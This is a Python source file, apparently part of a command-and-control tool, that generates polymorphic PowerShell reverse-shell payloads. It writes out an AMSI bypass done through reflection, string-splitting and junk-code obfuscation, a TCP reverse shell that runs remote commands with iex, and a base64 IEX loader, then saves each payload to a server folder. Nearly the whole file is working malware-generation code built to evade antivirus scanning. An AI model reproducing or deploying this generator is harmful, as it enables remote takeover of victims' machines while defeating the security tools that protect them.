import random
import string
import os
import base64
from datetime import datetime

def rand_name(length=None):
    length = length or random.randint(8, 14)
    return ''.join(random.choices(string.ascii_letters, k=length))

def split_string(s):
    # Obfuscates: "System.Net.Sockets.TCPClient" -> 'S'+'y'+'s'+...
    return '+'.join([f"'{c}'" for c in s])

def junk_code():
    j = [
        f"${rand_name()} = {random.randint(1,100)}",
        f"# {rand_name()}_{random.randint(1000,9999)}",
        f"$null = {random.randint(0,1)}",
        f"${rand_name()} = '{rand_name(3)}'",
        f"# {rand_name(4)}"
    ]
    return random.choice(j) + "\n"

def amsi_bypass_reflection(var):
    # Reliable, clean, and still obfuscated
    return (
        f"${var['amsi_type']} = {split_string('AMSI')}\n"
        f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
        f"+${var['amsi_type']}+{split_string('Utils')})\n"
        f"${var['amsi_failed']} = ${{{var['amsi_field']}}}.GetField(${{{var['amsi_type']}}}+{split_string('InitFailed')},'NonPublic,Static')\n"
        f"${var['amsi_failed']}.SetValue($null,$true)\n"
    )

def obf_type(type_name):
    # Returns ([string]'S'+'y'+'s'+'t'+'e'+'m'...)
    return f"([string]{split_string(type_name)})"

def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
    var = {k: rand_name() for k in [
        "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
        "sendback2", "sendbyte"
    ]}
    amsi_bypass = amsi_bypass_reflection(var)

    # --- The Correct, Fully Obfuscated Reverse Shell ---
    core_shell = (
        junk_code() +
        # Declare the type name for TCPClient
        f"${var['tcpclient']}_type = {split_string('System.Net.Sockets.TCPClient')}\n"
        # New-Object with TypeName ([string]...) -- prevents PowerShell from treating it as an array
        f"${var['tcpclient']} = New-Object -TypeName ([string]${var['tcpclient']}_type) -ArgumentList '{host}',{port}\n"
        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
        f"${var['bytes']} = 0..65535|%{{0}}\n"
        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
        # ASCIIEncoding type obfuscated
        f"    ${var['data']} = (New-Object -TypeName {obf_type('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
        f"    ${var['sendback']} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
        f"    ${var['sendback2']} = ${{{var['sendback']}}} + 'PS ' + (pwd).Path + '> '\n"
        f"    ${var['sendbyte']} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n"
        f"    ${{{var['stream']}}}.Flush()\n"
        "}\n" +
        junk_code()
    )

    # --- Loader: base64 only ---
    core_shell_bytes = core_shell.encode('utf-8')
    core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
    loader_var = rand_name()
    loader = (
        amsi_bypass +
        junk_code() +
        f"${loader_var} = '{core_shell_b64}'\n" +
        junk_code() +
        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})))\n"
    )
    ps = loader

    if write_file:
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(ps)
        return filename
    else:
        return ps

# Alias for your other code
generate_polymorphic_ps = generate_obfuscated_ps
